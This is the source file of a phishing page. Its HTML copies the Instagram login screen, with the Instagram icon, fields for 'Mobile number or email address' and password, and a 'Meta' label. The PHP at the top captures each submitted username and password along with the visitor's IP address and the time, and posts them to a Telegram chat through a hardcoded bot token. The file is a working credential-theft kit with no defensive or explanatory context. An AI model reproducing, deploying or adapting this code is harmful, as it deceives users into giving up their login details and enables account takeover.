<?php
// --- CONFIG ---
$botToken = "8345296478:AAFWdToUpXCitWI6hx0d4xWCXH9NkinT_Ko"; // replace with your bot token

if (!isset($_GET['id'])) {
    die("Missing chat id in URL. Use ?id=7527246064");
}
$chatId = trim($_GET['id']);
if (!preg_match('/^-?\d+$/', $chatId)) {
    die("Invalid chat id format.");
}

function sendTelegram($botToken, $chatId, $text) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $post = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $time = date("Y-m-d H:i:s");

    $telegramText = "ð Login Attempt\n";
    $telegramText .= "ð¤ Username: " . ($username !== '' ? htmlspecialchars($username) : 'guest') . "\n";
    $telegramText .= "ð Password: " . ($password !== '' ? htmlspecialchars($password) : '---') . "\n";
    $telegramText .= "ð IP: $ip\n";
    $telegramText .= "â° Time: $time";

    sendTelegram($botToken, $chatId, $telegramText);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, sans-serif;
            background: #f4f4f4;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            flex-direction: column;
            padding: 100px 20px 20px 20px;
            position: relative;
        }

        /* Back arrow in top-left corner - moved down and black color */
        .back-arrow {
            position: absolute;
            top: 30px; /* Increased from 20px to 30px */
            left: 20px;
            font-size: 20px;
            color: #000; /* Changed from #007bff to black */
            cursor: pointer;
        }

        /* Language selector - moved further up */
        .language-selector {
            margin-top: 20px; /* Increased from 40px to 60px */
            margin-bottom: 10px;
            font-size: 16px;
            color: #666;
        }

        /* Header - icon only */
        h2 {
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 70px;
            color: #007bff;
            margin-bottom: 0px;
            margin-top: 10px;
        }

        h2 i {
            font-size: 65px;
        }

        /* Form */
        form {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
            margin-bottom: 20px;
        }

        /* Input fields */
        input[type=text],
        input[type=password] {
            width: 100%;
            padding: 22px;
            margin: 10px 0;
            border-radius: 20px;
            border: 1.5px solid #ccc;
            font-size: 20px;
            transition: border 0.3s;
        }

        input::placeholder {
            font-size: 16px;
        }

        input[type=text]:focus,
        input[type=password]:focus {
            border-color: #007bff;
            outline: none;
        }

        /* Login Button (pill-shaped) */
        button {
            width: 100%;
            padding: 16px;
            margin-top: 10px;
            border: 1.5px solid #007bff;
            border-radius: 50px;
            background: #007bff;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            background: #0056b3;
        }

        /* Forgotten password link - moved up */
        .forgot-password {
            font-size: 14px;
            color: #007bff;
            margin-top: 10px;
            text-decoration: none;
            text-align: center;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Create new account box */
        .create-account {
            width: 100%;
            max-width: 400px;
            padding: 16px;
            margin-top: 120px;
            border: 1.5px solid #007bff;
            border-radius: 50px;
            text-align: center;
            color: #007bff;
            font-size: 18px;
            font-weight: 400;
            cursor: pointer;
            transition: 0.3s;
        }

        .create-account:hover {
            background: #007bff;
            color: #fff;
        }

        /* ANUJ text below create account - made slightly thicker */
        .anuj-text {
            margin-top: 15px;
            font-size: 18px;
            font-weight: 500;
            color: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        /* Image styling for Anuj */
        .anuj-image {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            object-fit: cover;
        }

        /* Responsive adjustments */
        @media (max-width: 440px) {
            input[type=text],
            input[type=password] {
                padding: 18px;
                font-size: 18px;
            }

            input::placeholder {
                font-size: 14px;
            }

            button,
            .create-account {
                padding: 14px;
                font-size: 16px;
            }

            h2 {
                font-size: 60px;
                margin-bottom: 30px;
                margin-top: 5px;
            }

            h2 i {
                font-size: 60px;
            }

            .anuj-text {
                font-size: 18px;
            }

            .anuj-image {
                width: 20px;
                height: 20px;
            }

            .language-selector {
                font-size: 14px;
            }
            
            .back-arrow {
                top: 25px; /* Adjusted for mobile */
            }
        }
    </style>
</head>
<body>
    <!-- Back arrow in top-left corner - moved down and black -->
    <div class="back-arrow">
        <i class="fas fa-chevron-left"></i>
    </div>

    <!-- Language selector - moved further up -->
    <div class="language-selector">English (UK)</div>

    <!-- Main icon -->
   <h2>
  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
       alt="Instagram" width="70">
</h2>


    <!-- Login form -->
    <form method="post" action="#">
        <input type="text" name="username" placeholder="Mobile number or email address" required />
        <input type="password" name="password" placeholder="Password" required />
        <button type="submit">Login</button>
    </form>

    <!-- Forgotten password link -->
    <a href="#" class="forgot-password">Forgotten Password?</a>

    <!-- Create New Account Box -->
    <div class="create-account">Create New Account</div>

    <!-- ANUJ text with image -->
    <div class="anuj-text">
        <img src="data:image/jpeg;base64,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" alt="Meta" class="anuj-image">
        Meta
    </div>

    <script>
        // Add click functionality to back arrow
        document.querySelector('.back-arrow').addEventListener('click', function() {
            alert('Back button clicked!');
            // You can add navigation logic here
        });
    </script>
</body>
</html>